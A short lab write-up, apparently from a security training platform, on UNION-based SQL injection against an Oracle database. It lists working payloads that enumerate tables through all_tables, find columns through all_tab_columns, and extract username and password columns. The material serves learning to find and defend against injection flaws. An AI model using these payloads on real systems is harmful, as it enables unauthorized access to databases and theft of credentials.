# Lab: SQL Injection Attack (Listing Database Contents - Oracle)

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | UNION-Based SQLi |
| **Database** | Oracle |
| **Goal** | Enumerate Oracle database structure to find hidden tables. |
| **Status** | ✅ Solved |

---

##  Conceptual Overview
Oracle databases do not use `information_schema`. Instead, they use specific **Data Dictionary views**.
* **`all_tables`**: Lists all tables accessible to the user.
* **`all_tab_columns`**: Lists all columns in those tables.
* **Note:** In Oracle, table and column names are stored in **UPPERCASE**.

---

##  Exploitation Steps

### Phase 1: Finding the Table Name
* **Payload:**
    ```sql
    ' UNION SELECT table_name, NULL FROM all_tables--
    ```
* **Result:** Found a table named `USERS_XXXX` (Upper Case).

### Phase 2: Finding Column Names
* **Payload:**
    ```sql
    ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XXXX'--
    ```
* **Result:** Found columns `USERNAME_XXXX` and `PASSWORD_XXXX`.

### Phase 3: Data Extraction
* **Payload:**
    ```sql
    ' UNION SELECT USERNAME_XXXX, PASSWORD_XXXX FROM USERS_XXXX--
    ```

---